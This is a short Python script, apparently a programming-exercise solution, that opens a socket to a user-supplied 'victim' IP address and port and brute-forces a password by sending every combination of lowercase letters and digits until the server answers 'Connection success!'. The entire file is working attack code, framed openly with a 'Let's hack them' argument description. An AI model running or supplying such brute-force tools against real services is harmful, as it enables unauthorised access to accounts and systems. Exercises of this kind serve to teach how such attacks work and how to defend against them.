import socket
import argparse
import itertools
import string


class Hacker:

    def __init__(self):
        self.socket = socket.socket()

    def connect(self, ip_address, sock):
        hostname = (ip_address, sock)
        self.socket.connect(hostname)

    def send_message(self, message):
        encoded_message = message.encode()
        self.socket.send(encoded_message)

    def receive_response(self):
        response = self.socket.recv(1024)
        response = response.decode()
        return response

    def close_connection(self):
        self.socket.close()

    def __del__(self):
        self.socket.close()


def password_generator():
    pass_chars = string.ascii_lowercase + string.digits
    for pass_len in range(1, len(pass_chars) + 1):
        for comb in itertools.product(pass_chars, repeat=pass_len):
            yield "".join(comb)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Let's hack them... Enter victim's IP_address and socket")
    parser.add_argument("ip_address")
    parser.add_argument("socket")

    args = parser.parse_args()

    if args.ip_address == "localhost":
        args.ip_address = "127.0.0.1"

    try:
        args.socket = int(args.socket)
    except ValueError:
        print("Socket must be integer value!")
        exit()

    hacky = Hacker()
    hacky.connect(args.ip_address, int(args.socket))

    for password in password_generator():
        hacky.send_message(password)
        response = hacky.receive_response()
        if response == "Connection success!":
            print(password)
            break
